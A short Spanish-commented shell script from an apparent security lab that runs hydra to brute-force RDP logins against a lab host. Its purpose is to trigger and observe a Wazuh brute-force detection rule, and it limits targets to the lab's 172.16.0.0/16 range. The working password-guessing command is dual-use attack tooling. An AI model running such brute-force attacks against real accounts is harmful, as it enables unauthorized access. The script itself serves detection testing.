#!/bin/sh
# Fuerza bruta de RDP contra un host de CORP, desde KALI01 (Fase 10).
#
# Antes de correr: crear en el usuario de prueba (ver scripts/ad-bulk/, Fase
# 7) una contraseña que esté en wordlist-rdp.txt, para que el ataque "gane" y
# se pueda ver el logon exitoso que sigue a los fallidos en el dashboard.
#
# Uso: sh bruteforce-rdp.sh <IP-objetivo> <usuario> [wordlist]
#   sh bruteforce-rdp.sh 172.16.0.150 uprueba wordlist-rdp.txt

TARGET=$1
USER=$2
WORDLIST=${3:-wordlist-rdp.txt}

if [ -z "$TARGET" ] || [ -z "$USER" ]; then
    echo "Uso: sh bruteforce-rdp.sh <IP-objetivo> <usuario> [wordlist]" >&2
    exit 1
fi

case "$TARGET" in
    172.16.*) ;;
    *)
        echo "Este script solo apunta a IPs del lab (172.16.0.0/16)." >&2
        exit 1
        ;;
esac

if ! command -v hydra >/dev/null 2>&1; then
    echo "hydra no está instalado (sudo apt install hydra)." >&2
    exit 1
fi

echo "== Fuerza bruta RDP contra $TARGET, usuario '$USER' =="
echo "Wordlist: $WORDLIST ($(wc -l < "$WORDLIST") contraseñas)"
echo "Esto genera varios logon fallidos (4625) seguidos, a propósito, para"
echo "que Wazuh dispare la regla de fuerza bruta. Observar en el dashboard:"
echo "Threat hunting -> agent.name:WS01 -> win.system.eventID:4625"
echo

hydra -t 1 -l "$USER" -P "$WORDLIST" rdp://"$TARGET"

echo
echo "Si encontró la contraseña, confirmar en Wazuh que después del último"
echo "4625 aparece un 4624 (logon exitoso) desde la misma IP de origen."
